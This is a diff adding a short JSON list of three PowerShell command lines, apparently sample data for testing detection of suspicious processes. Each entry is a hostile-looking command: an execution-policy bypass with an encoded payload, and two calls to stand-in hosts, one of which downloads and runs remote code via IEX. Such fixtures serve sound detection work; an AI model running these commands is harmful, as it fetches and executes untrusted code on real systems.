@@ -1,0 +1,11 @@
+[
+  {
+    "CommandLine": "powershell -ExecutionPolicy Bypass -NoProfile -enc abc123"
+  },
+  {
+    "CommandLine": "powershell Invoke-WebRequest http://malicious.com"
+  },
+  {
+    "CommandLine": "powershell -NoProfile IEX (New-Object Net.WebClient).DownloadString('http://bad.com')"
+  }
+]
